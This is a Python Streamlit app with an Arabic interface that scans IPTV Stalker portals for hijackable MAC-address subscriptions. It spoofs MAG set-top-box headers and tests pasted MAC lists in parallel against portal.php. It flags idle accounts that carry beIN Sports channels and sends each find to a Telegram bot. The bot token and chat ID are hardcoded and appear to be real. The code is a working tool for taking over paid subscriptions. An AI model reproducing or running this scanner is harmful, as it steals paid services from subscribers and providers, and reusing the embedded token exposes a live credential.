import streamlit as st
import requests
import time
import telebot
import random
import re
import json
from datetime import datetime, timedelta
import pandas as pd
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============ 🔑 بياناتك ============
TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
ID = 7638628794
bot = telebot.TeleBot(TOKEN)

# ============ 📺 القنوات المستهدفة ============
CHANNELS_KEYS = {
    "BEIN AFRICA CUP 2025": ["AFRICA", "2025"],
    "IARI BEIN SPORTS 8K": ["8K", "IARI"],
    "IARI BEIN SPORTS 4K": ["4K", "IARI"],
}

st.set_page_config(page_title="Radar Ayoub Hammami Pro", layout="wide")

# تصميم الواجهة الاحترافي
st.markdown("""
<style>
    .main-header { text-align: center; background: linear-gradient(90deg, #b91d1d 0%, #431407 100%); 
    padding: 1.5rem; border-radius: 15px; color: white; margin-bottom: 2rem; }
    .stButton>button { width: 100%; background-color: #b91d1d; color: white; border-radius: 10px; }
</style>
<div class="main-header">
    <h1>📡 Radar Ayoub Hammami Pro</h1>
    <p>نظام الفحص المتوازي واصطياد الماكات الذهبية</p>
</div>
""", unsafe_allow_html=True)

# ============ ⚙️ المحرك التقني ============

def get_auth_headers(mac):
    agents = [
        "MAG254/2.2.0 (Qt; Linux; C) stbapp ver: 2 rev: 250",
        "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Safari/533.3",
        "Model: MAG250; Link: WiFi"
    ]
    return {
        'User-Agent': random.choice(agents),
        'Cookie': f'mac={mac}',
        'X-User-Agent': 'Model: MAG254; Link: WiFi'
    }

def check_mac_logic(host, mac, timeout):
    try:
        headers = get_auth_headers(mac)
        base_url = f"http://{host}/portal.php"
        
        # 1. فحص البروفايل والمتصلين والتاريخ
        start = time.time()
        r = requests.get(f"{base_url}?type=stb&action=get_profile&force_stb=1", headers=headers, timeout=timeout)
        latency = (time.time() - start) * 1000
        
        if r.status_code == 200:
            data_text = r.text
            active = re.search(r'"active_cons"\s*:\s*"(\d+)"', data_text)
            active_val = int(active.group(1)) if active else 1
            
            # استخراج التاريخ
            exp = re.search(r'"end_date"\s*:\s*"([^"]+)"', data_text)
            exp_val = exp.group(1) if exp else "غير محدد"
            
            if active_val == 0:
                # 2. فحص القنوات
                r_ch = requests.get(f"{base_url}?type=itv&action=get_all_channels", headers=headers, timeout=timeout)
                ch_text = r_ch.text.upper()
                found = [n for n, keys in CHANNELS_KEYS.items() if all(k in ch_text for k in keys)]
                
                return {
                    'mac': mac, 'status': 'AVAILABLE', 'latency': f"{int(latency)}ms",
                    'active': 0, 'expiry': exp_val, 'channels': found
                }
            return {'mac': mac, 'status': 'BUSY', 'active': active_val, 'expiry': exp_val}
    except:
        pass
    return {'mac': mac, 'status': 'OFFLINE'}

# ============ 🖥️ واجهة المستخدم ============

input_data = st.text_area("🚀 الصق البيانات هنا (روابط + ماكات عشوائية):", height=200)

col_cfg1, col_cfg2 = st.columns(2)
with col_cfg1:
    threads = st.slider("👥 عدد الخيوط (السرعة)", 1, 30, 15)
with col_cfg2:
    timeout_sec = st.slider("⏱️ مهلة الانتظار", 3, 15, 7)

if st.button("🏁 ابدأ المسح الشامل"):
    # استخراج الماكات والرابط
    found_macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', input_data.upper())))
    host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', input_data)
    
    if host_match and found_macs:
        host = host_match.group(0).split('/portal.php')[0].replace("http://", "").replace("https://", "").strip("/")
        
        st.info(f"🌐 السيرفر: {host} | 🎯 الأهداف: {len(found_macs)}")
        
        progress = st.progress(0)
        results = []
        
        # الفحص المتوازي
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(check_mac_logic, host, m, timeout_sec): m for m in found_macs}
            
            for i, future in enumerate(as_completed(futures)):
                res = future.result()
                if res['status'] == 'AVAILABLE':
                    results.append(res)
                    # تنبيه تلغرام فوري
                    msg = f"🎯 **صيد جديد - Radar Ayoub**\n🖥️ الماك: `{res['mac']}`\n📅 ينتهي: {res['expiry']}\n📊 الاستقرار: {res['latency']}\n📺 القنوات: {', '.join(res['channels'])}"
                    bot.send_message(ID, msg, parse_mode="Markdown")
                    st.success(f"✅ وجدنا ماك متاح: {res['mac']}")
                
                progress.progress((i + 1) / len(found_macs))

        # عرض النتائج النهائية في جدول
        if results:
            st.divider()
            st.subheader("📊 الماكات الذهبية المكتشفة")
            df = pd.DataFrame(results)
            st.table(df)
            st.balloons()
        else:
            st.warning("📭 اكتمل المسح ولم نجد ماكات فارغة حالياً.")
    else:
        st.error("❌ تأكد من وجود رابط وماكات في النص.")

st.sidebar.markdown("### 👤 المطور: Ayoub Hammami")
st.sidebar.info("هذا النظام مخصص للفحص السريع واصطياد اشتراكات الـ STB النشطة.")
